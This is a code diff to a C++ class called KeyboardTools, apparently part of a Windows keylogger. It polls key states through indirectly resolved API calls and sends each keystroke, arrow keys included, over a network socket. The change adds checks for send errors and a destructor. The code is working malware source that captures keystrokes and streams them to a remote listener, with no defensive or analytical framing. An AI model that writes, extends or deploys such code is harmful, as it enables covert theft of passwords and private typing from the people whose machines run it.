@@ -5,6 +5,7 @@ class KeyboardTools{
 		FILE* outputfd;
 
 		int key;
+		int tmp;
 
 	public:
 		char* GetEventFile(){
@@ -60,39 +61,44 @@ class KeyboardTools{
 					if (funcGetAsyncKeyState(key)==-32767){
 						switch(key){
 							case 0x0d:
-								funcsend (outputFd, "\r\n", 2, 0);
+								tmp=funcsend (outputFd, "\r\n", 2, 0);
 								break;
 							case 0xdc:
-								funcsend (outputFd, "\\", 1, 0);
+								tmp=funcsend (outputFd, "\\", 1, 0);
 								break;
 							case 0x25:
-								funcsend (outputFd, "<Left Arrow>", 12, 0);
+								tmp=funcsend (outputFd, "<Left Arrow>", 12, 0);
 								break;
 							case 0x26:
-								funcsend (outputFd, "<Up Arrow>", 10, 0);
+								tmp=funcsend (outputFd, "<Up Arrow>", 10, 0);
 								break;
 							case 0x27:
-								funcsend (outputFd, "<Right Arrow>", 13, 0);
+								tmp=funcsend (outputFd, "<Right Arrow>", 13, 0);
 								break;
 							case 0x28:
-								funcsend(outputFd, "<Bottom Arrow>", 14, 0);
+								tmp=funcsend(outputFd, "<Bottom Arrow>", 14, 0);
 								break;
 							case 0x10:
 								break;
 							case 0xbe:
-								funcsend(outputFd, ".", 1, 0);
+								tmp=funcsend(outputFd, ".", 1, 0);
 								break;
 							case 0xbc:
-								funcsend(outputFd, ",", 1, 0);
+								tmp=funcsend(outputFd, ",", 1, 0);
 								break;
 							default:
 							if (key>64&&key<92&&!(funcGetAsyncKeyState(0x10)))key+=32;
-								funcsend(outputFd,(const char*) &key, 1, 0);
+								tmp=funcsend(outputFd,(const char*) &key, 1, 0);
 						}
+						if (tmp == SOCKET_ERROR)
+							return;
 					}
 				}
 
 			}
+		}
+		~KeyboardTools(){
+			fclose(outputfd);
 		}
 };
 
